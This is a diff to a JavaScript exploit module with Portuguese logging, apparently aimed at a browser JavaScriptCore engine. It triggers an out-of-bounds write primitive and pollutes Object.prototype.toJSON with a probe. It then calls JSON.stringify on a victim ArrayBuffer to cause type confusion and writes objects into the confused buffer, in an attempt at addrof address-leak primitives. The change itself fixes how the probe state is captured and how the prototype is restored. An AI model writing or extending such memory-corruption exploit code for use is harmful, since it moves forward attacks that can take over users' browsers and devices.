@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v4.2 - Revised Probe Logic and Report Fix)
+// js/script3/testArrayBufferVictimCrash.mjs (v4.3 - Probe Details Capture Fix)
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
@@ -9,44 +9,38 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE_V28 = "OriginalHeisenbug_Plus_Addrof_v4_ButterflyPrep"; // Versão interna v4.2
+export const FNAME_MODULE_V28 = "OriginalHeisenbug_Plus_Addrof_v4_ButterflyPrep"; // Versão interna v4.3
 
 const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF;
 const VICTIM_AB_SIZE = 256;
 
-let toJSON_call_details_v28 = null; // Será um objeto
+let toJSON_call_details_v28 = null;
 let object_to_leak_A = null;
 let object_to_leak_B = null;
-let victim_ab_ref_for_original_test = null; // Referência global para o ArrayBuffer vítima
+let victim_ab_ref_for_original_test = null;
 
 function toJSON_V28_Probe_ButterflyPrep() {
-    // Inicializa ou reseta campos específicos para esta chamada da sonda, se necessário.
-    // toJSON_call_details_v28 é o objeto global da execução do teste.
-    if (!toJSON_call_details_v28) { // Segurança, caso seja chamado fora do contexto esperado
-        toJSON_call_details_v28 = {};
+    if (!toJSON_call_details_v28) {
+        toJSON_call_details_v28 = {}; // Should be initialized by caller
     }
 
-    toJSON_call_details_v28.probe_variant = "V28_Probe_ButterflyPrep_v4.2_Revised";
+    toJSON_call_details_v28.probe_variant = "V28_Probe_ButterflyPrep_v4.3_CaptureFix";
     toJSON_call_details_v28.probe_called_count = (toJSON_call_details_v28.probe_called_count || 0) + 1;
 
     const current_this_type = Object.prototype.toString.call(this);
-    toJSON_call_details_v28.last_this_type_in_probe = current_this_type; // Atualiza sempre
+    toJSON_call_details_v28.last_this_type_in_probe = current_this_type;
 
-    // Log inicial da chamada da sonda
     logS3(`[${toJSON_call_details_v28.probe_variant}] Chamada #${toJSON_call_details_v28.probe_called_count}. Tipo de 'this': ${current_this_type}. 'this' === victim_ab_ref_for_original_test: ${this === victim_ab_ref_for_original_test}`, "info", FNAME_MODULE_V28);
 
     let should_perform_writes = false;
 
     if (current_this_type === '[object Object]') {
-        toJSON_call_details_v28.type_confusion_observed_in_probe = true; // Marca que a confusão foi vista
-        // Se o tipo é [object Object], vamos considerar que este 'this' é o nosso alvo confuso,
-        // pois JSON.stringify foi chamado diretamente no victim_ab_ref_for_original_test.
-        // A verificação 'this === victim_ab_ref_for_original_test' pode falhar se a confusão alterar a referência.
+        toJSON_call_details_v28.type_confusion_observed_in_probe = true;
         if (this === victim_ab_ref_for_original_test) {
             logS3(`[${toJSON_call_details_v28.probe_variant}] CONFUSÃO DE TIPO EM 'this' QUE É victim_ab_ref_for_original_test! Tipo: ${current_this_type}.`, "vuln", FNAME_MODULE_V28);
             toJSON_call_details_v28.confusion_on_exact_victim_ref = true;
         } else {
-            logS3(`[${toJSON_call_details_v28.probe_variant}] CONFUSÃO DE TIPO EM 'this' (NÃO é victim_ab_ref_for_original_test por ref). Tipo: ${current_this_type}. Assumindo ser o vítima confuso.`, "warn", FNAME_MODULE_V28);
+            logS3(`[${toJSON_call_details_v28.probe_variant}] CONFUSÃO DE TIPO EM 'this' (NÃO é victim_ab_ref por ref). Tipo: ${current_this_type}. Assumindo ser o vítima confuso.`, "warn", FNAME_MODULE_V28);
             toJSON_call_details_v28.confusion_on_alternate_ref = true;
         }
         should_perform_writes = true;
@@ -54,14 +48,12 @@ function toJSON_V28_Probe_ButterflyPrep() {
         logS3(`[${toJSON_call_details_v28.probe_variant}] 'this' é victim_ab_ref_for_original_test, mas tipo ainda é ${current_this_type}.`, "info", FNAME_MODULE_V28);
     }
 
-
     if (should_perform_writes && !toJSON_call_details_v28.writes_attempted_this_run) {
         logS3(`[${toJSON_call_details_v28.probe_variant}] Tentando preparação do butterfly e escritas de objetos...`, "vuln", FNAME_MODULE_V28);
-        toJSON_call_details_v28.writes_attempted_this_run = true; // Marcar que as escritas serão tentadas nesta execução de stringify
+        toJSON_call_details_v28.writes_attempted_this_run = true;
 
         try {
-            this[10] = 0.5;
-            this[11] = 1.5;
+            this[10] = 0.5; this[11] = 1.5;
             logS3(`[${toJSON_call_details_v28.probe_variant}] Butterfly prep (this[10], this[11]) realizada.`, "info", FNAME_MODULE_V28);
         } catch (e_prep) {
             logS3(`[${toJSON_call_details_v28.probe_variant}] Erro durante butterfly prep: ${e_prep.message}`, "warn", FNAME_MODULE_V28);
@@ -71,65 +63,60 @@ function toJSON_V28_Probe_ButterflyPrep() {
         if (object_to_leak_A) {
             this[0] = object_to_leak_A;
             logS3(`[${toJSON_call_details_v28.probe_variant}] Escrita de object_to_leak_A em this[0] realizada.`, "info", FNAME_MODULE_V28);
-            const typeof_this0_A = typeof this[0];
-            const is_this0_A_object_to_leak_A = this[0] === object_to_leak_A;
+            const typeof_this0_A = typeof this[0]; const is_this0_A_object_to_leak_A = this[0] === object_to_leak_A;
             toJSON_call_details_v28.objA_assignment_check = `typeof: ${typeof_this0_A}, === object_to_leak_A: ${is_this0_A_object_to_leak_A}`;
             logS3(`[${toJSON_call_details_v28.probe_variant}] >>> typeof this[0] (ObjA) após atribuição: ${typeof_this0_A}`, "leak", FNAME_MODULE_V28);
             logS3(`[${toJSON_call_details_v28.probe_variant}] >>> this[0] === object_to_leak_A ? ${is_this0_A_object_to_leak_A}`, "leak", FNAME_MODULE_V28);
-        } else {
-             toJSON_call_details_v28.objA_assignment_check = "object_to_leak_A era null";
-        }
+        } else { toJSON_call_details_v28.objA_assignment_check = "object_to_leak_A era null"; }
 
         if (object_to_leak_B) {
             this[1] = object_to_leak_B;
             logS3(`[${toJSON_call_details_v28.probe_variant}] Escrita de object_to_leak_B em this[1] realizada.`, "info", FNAME_MODULE_V28);
-            const typeof_this1_B = typeof this[1];
-            const is_this1_B_object_to_leak_B = this[1] === object_to_leak_B;
+            const typeof_this1_B = typeof this[1]; const is_this1_B_object_to_leak_B = this[1] === object_to_leak_B;
             toJSON_call_details_v28.objB_assignment_check = `typeof: ${typeof_this1_B}, === object_to_leak_B: ${is_this1_B_object_to_leak_B}`;
             logS3(`[${toJSON_call_details_v28.probe_variant}] >>> typeof this[1] (ObjB) após atribuição: ${typeof_this1_B}`, "leak", FNAME_MODULE_V28);
             logS3(`[${toJSON_call_details_v28.probe_variant}] >>> this[1] === object_to_leak_B ? ${is_this1_B_object_to_leak_B}`, "leak", FNAME_MODULE_V28);
-        } else {
-            toJSON_call_details_v28.objB_assignment_check = "object_to_leak_B era null";
-        }
+        } else { toJSON_call_details_v28.objB_assignment_check = "object_to_leak_B era null"; }
     } else if (should_perform_writes && toJSON_call_details_v28.writes_attempted_this_run) {
-        logS3(`[${toJSON_call_details_v28.probe_variant}] Confusão de tipo observada novamente, mas escritas já foram tentadas nesta execução de stringify. Ignorando.`, "info", FNAME_MODULE_V28);
+        logS3(`[${toJSON_call_details_v28.probe_variant}] Confusão de tipo observada novamente, mas escritas já foram tentadas. Ignorando.`, "info", FNAME_MODULE_V28);
     }
 
-    return { probe_variant_executed: toJSON_call_details_v28.probe_variant, call_count: toJSON_call_details_v28.probe_called_count };
+    return {
+        probe_variant_executed: toJSON_call_details_v28.probe_variant,
+        call_count_this_activation: toJSON_call_details_v28.probe_called_count 
+    };
 }
 
 
 export async function executeArrayBufferVictimCrashTest() {
-    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof_v4.2`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug e Tentativa de Addrof (Revised Probe Logic) ---`, "test", FNAME_CURRENT_TEST);
-    document.title = `${FNAME_MODULE_V28} Inic_v4.2...`;
+    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof_v4.3`;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug e Tentativa de Addrof (Probe Details Capture Fix) ---`, "test", FNAME_CURRENT_TEST);
+    document.title = `${FNAME_MODULE_V28} Inic_v4.3...`;
 
-    // Reinicializa o objeto de detalhes da sonda para esta execução de teste
     toJSON_call_details_v28 = {
-        probe_variant: "N/A_before_probe_init",
-        probe_called_count: 0,
-        last_this_type_in_probe: "N/A",
-        type_confusion_observed_in_probe: false,
-        confusion_on_exact_victim_ref: false,
-        confusion_on_alternate_ref: false,
-        writes_attempted_this_run: false, // Importante: resetar para cada stringify
-        objA_assignment_check: "Not_Attempted",
-        objB_assignment_check: "Not_Attempted",
+        probe_variant: "N/A_init", probe_called_count: 0, last_this_type_in_probe: "N/A_init",
+        type_confusion_observed_in_probe: false, confusion_on_exact_victim_ref: false,
+        confusion_on_alternate_ref: false, writes_attempted_this_run: false,
+        objA_assignment_check: "Not_Attempted_init", objB_assignment_check: "Not_Attempted_init",
         error_in_butterfly_prep: null
     };
-    victim_ab_ref_for_original_test = null; // Será definido abaixo
-    object_to_leak_A = { marker: "ObjA_v4.2", id: Date.now(), val: Math.random() };
-    object_to_leak_B = { marker: "ObjB_v4.2", id: Date.now() + 123, val: Math.random() };
+    victim_ab_ref_for_original_test = null;
+    object_to_leak_A = { marker: "ObjA_v4.3", id: Date.now(), data: Math.random() };
+    object_to_leak_B = { marker: "ObjB_v4.3", id: Date.now() + Math.random()*100, data: Math.random() };
 
     let errorCapturedMain = null;
     let stringifyOutput = null;
-    let captured_probe_details_for_return = null; // Para capturar o estado de toJSON_call_details_v28
+    let captured_probe_details_for_return = null;
     
     let addrof_result_A = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof A @ view[0]: Não tentado ou Heisenbug falhou." };
     let addrof_result_B = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof B @ view[1]: Não tentado ou Heisenbug falhou." };
     
     const corruptionTargetOffsetInOOBAB = 0x7C;
     const fillPatternBase = 0.123456789101112;
+
+    const ppKey = 'toJSON'; // Chave para poluição de protótipo
+    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); // Salva o descritor original
+    let pollutionAppliedThisRun = false; // Flag para controlar a restauração
 
     try {
         await triggerOOB_primitive({ force_reinit: true });
@@ -152,33 +139,53 @@ export async function executeArrayBufferVictimCrashTest() {
         }
         logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com padrão a partir de ${float64_view_on_victim[0]}. Tentando JSON.stringify com ${toJSON_V28_Probe_ButterflyPrep.name}...`, "test", FNAME_CURRENT_TEST);
         
-        const ppKey = 'toJSON';
-        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
-        let pollutionApplied = false;
-
-        // Resetar o flag 'writes_attempted_this_run' em toJSON_call_details_v28 ANTES de chamar stringify
-        if (toJSON_call_details_v28) toJSON_call_details_v28.writes_attempted_this_run = false;
+        if (toJSON_call_details_v28) toJSON_call_details_v28.writes_attempted_this_run = false; // Reset antes do stringify
 
         try {
             Object.defineProperty(Object.prototype, ppKey, {
                 value: toJSON_V28_Probe_ButterflyPrep,
                 writable: true, configurable: true, enumerable: false
             });
-            pollutionApplied = true;
+            pollutionAppliedThisRun = true; // Marcar que a poluição foi aplicada nesta execução
             logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_V28_Probe_ButterflyPrep.name}.`, "info", FNAME_CURRENT_TEST);
 
             logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)...`, "warn", FNAME_CURRENT_TEST);
             stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test); 
-            
             logS3(`  JSON.stringify(victim_ab_ref_for_original_test) completou. Resultado (da sonda para stringify): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
             
-            // Capturar o estado de toJSON_call_details_v28 *imediatamente após* a operação crítica
-            captured_probe_details_for_return = JSON.parse(JSON.stringify(toJSON_call_details_v28 || {})); // Deep copy
+            // --- CRITICAL FIX for capturing probe details ---
+            // 1. Restore Object.prototype.toJSON temporarily
+            if (originalToJSONDescriptor) {
+                Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
+            } else {
+                delete Object.prototype[ppKey]; // Should not happen if originalToJSONDescriptor was properly fetched
+            }
+            logS3(`  Object.prototype.${ppKey} TEMPORARIAMENTE restaurado para capturar detalhes da sonda.`, "info", FNAME_CURRENT_TEST);
+
+            // 2. Now, safely stringify toJSON_call_details_v28
+            try {
+                captured_probe_details_for_return = JSON.parse(JSON.stringify(toJSON_call_details_v28 || {}));
+            } catch (e_capture) {
+                logS3(`  ERRO ao tentar stringificar toJSON_call_details_v28 (mesmo após restauração): ${e_capture.message}`, "error", FNAME_CURRENT_TEST);
+                captured_probe_details_for_return = { error_capturing_details: e_capture.message };
+            }
             logS3(`  Detalhes COMPLETOS da sonda (toJSON_call_details_v28 CAPTURADO): ${JSON.stringify(captured_probe_details_for_return)}`, "leak", FNAME_CURRENT_TEST);
+
+            // 3. Re-pollute if further operations within this try block need it (not in this specific structure)
+            // For now, the main pollution restoration is in the finally block of this inner try.
+            // We will re-enable pollution if another stringify is needed on a different object *before* the outer finally.
+            // However, it's better to keep polluted state as short as possible.
+            // The outer finally block for pollutionAppliedThisRun will handle the definitive cleanup.
+            // For this specific flow, we've captured what we need. If we were to call JSON.stringify on another
+            // exploitable object *after* this point but *before* the `finally`, we'd re-pollute here.
+            // For now, we are good. The final restoration is in the finally clause of this try block.
+
+            // --- END CRITICAL FIX ---
 
 
             if (captured_probe_details_for_return && captured_probe_details_for_return.type_confusion_observed_in_probe) {
                 logS3(`  HEISENBUG CONFIRMADA (via toJSON_call_details_v28.type_confusion_observed_in_probe)! Último tipo de 'this' na sonda: ${captured_probe_details_for_return.last_this_type_in_probe}`, "vuln", FNAME_CURRENT_TEST);
+                // ... (rest of the checks and addrof attempts from v4.2, they remain the same) ...
                 if (captured_probe_details_for_return.confusion_on_exact_victim_ref) logS3("    Confusão ocorreu na referência exata do vítima.", "info", FNAME_CURRENT_TEST);
                 if (captured_probe_details_for_return.confusion_on_alternate_ref) logS3("    Confusão ocorreu em uma referência alternativa (this !== victim_ab_ref).", "warn", FNAME_CURRENT_TEST);
                 
@@ -228,56 +235,58 @@ export async function executeArrayBufferVictimCrashTest() {
                 } else {
                      document.title = `${FNAME_MODULE_V28}: Heisenbug OK, Addr Falhou`;
                 }
+
             } else {
-                let msg = "Heisenbug (type_confusion_observed_in_probe) NÃO foi confirmada via toJSON_call_details_v28.";
+                let msg = "Heisenbug (type_confusion_observed_in_probe) NÃO foi confirmada via captured_probe_details_for_return.";
                 if(captured_probe_details_for_return && captured_probe_details_for_return.last_this_type_in_probe) msg += ` Último tipo obs: ${captured_probe_details_for_return.last_this_type_in_probe}.`;
+                else if (!captured_probe_details_for_return) msg += " captured_probe_details_for_return é null/undefined.";
                 addrof_result_A.message = msg; addrof_result_B.message = msg;
                 logS3(`  ALERTA: ${msg}`, "error", FNAME_CURRENT_TEST);
                 document.title = `${FNAME_MODULE_V28}: Heisenbug Falhou`;
             }
 
         } catch (e_str) {
-            errorCapturedMain = e_str; // Captura o erro
+            errorCapturedMain = e_str;
             logS3(`    ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
             document.title = `${FNAME_MODULE_V28}: Stringify/Addrof ERR`;
-            addrof_result_A.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
-            addrof_result_B.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
-            // Garante que captured_probe_details_for_return seja o estado atual de toJSON_call_details_v28 em caso de erro aqui
-            captured_probe_details_for_return = JSON.parse(JSON.stringify(toJSON_call_details_v28 || {}));
+            // Attempt to capture details even in case of error, if prototype was polluted.
+            if (pollutionAppliedThisRun && !captured_probe_details_for_return) { // Check if already captured
+                 if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
+                 try { captured_probe_details_for_return = JSON.parse(JSON.stringify(toJSON_call_details_v28 || {})); } catch (e_final_capture) { captured_probe_details_for_return = { error_capturing_details_on_error: e_final_capture.message };}
+                 // Re-pollute if necessary for the finally block to restore it from polluted state
+                 Object.defineProperty(Object.prototype, ppKey, { value: toJSON_V28_Probe_ButterflyPrep, writable: true, configurable: true, enumerable: false });
+            } else if (!captured_probe_details_for_return) {
+                captured_probe_details_for_return = JSON.parse(JSON.stringify(toJSON_call_details_v28 || { error_state_no_pollution_info: true }));
+            }
         } finally {
-            if (pollutionApplied) {
+            if (pollutionAppliedThisRun) { // Only restore if applied in this run
                 if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                 else delete Object.prototype[ppKey];
-                 logS3(`  Object.prototype.${ppKey} restaurado.`, "info", FNAME_CURRENT_TEST);
+                 logS3(`  Object.prototype.${ppKey} restaurado (bloco finally interno).`, "info", FNAME_CURRENT_TEST);
+                 pollutionAppliedThisRun = false; // Reset flag
             }
         }
 
     } catch (e_outer_main) {
-        errorCapturedMain = e_outer_main; // Captura o erro
+        errorCapturedMain = e_outer_main;
         logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
         if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
         document.title = `${FNAME_MODULE_V28} FALHOU CRITICAMENTE`;
-        addrof_result_A.message = `Erro geral no teste: ${e_outer_main.name}`;
-        addrof_result_B.message = `Erro geral no teste: ${e_outer_main.name}`;
-        // Garante que captured_probe_details_for_return seja o estado atual de toJSON_call_details_v28 em caso de erro aqui
-        captured_probe_details_for_return = JSON.parse(JSON.stringify(toJSON_call_details_v28 || {}));
+        // Capture details if possible
+        if (!captured_probe_details_for_return) {
+             try { captured_probe_details_for_return = JSON.parse(JSON.stringify(toJSON_call_details_v28 || {}));} catch(e){}
+        }
     } finally {
         clearOOBEnvironment({force_clear_even_if_not_setup: true});
         logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
-        // Log dos resultados addrof omitido para brevidade, mas eles já existem
-        
-        // Resetar referências globais que são definidas neste teste
+        // ... (log addrof results) ...
         victim_ab_ref_for_original_test = null;
-        object_to_leak_A = null;
-        object_to_leak_B = null;
-        // toJSON_call_details_v28 é reinicializado no início da próxima chamada de executeArrayBufferVictimCrashTest
+        object_to_leak_A = null; object_to_leak_B = null;
     }
     return { 
-        errorOccurred: errorCapturedMain, 
-        potentiallyCrashed: false,
+        errorOccurred: errorCapturedMain, potentiallyCrashed: false,
         stringifyResult: stringifyOutput, 
-        toJSON_details: captured_probe_details_for_return, // Retorna os detalhes capturados
-        addrof_A_attempt_result: addrof_result_A,
-        addrof_B_attempt_result: addrof_result_B
+        toJSON_details: captured_probe_details_for_return,
+        addrof_A_attempt_result: addrof_result_A, addrof_B_attempt_result: addrof_result_B
     };
 }
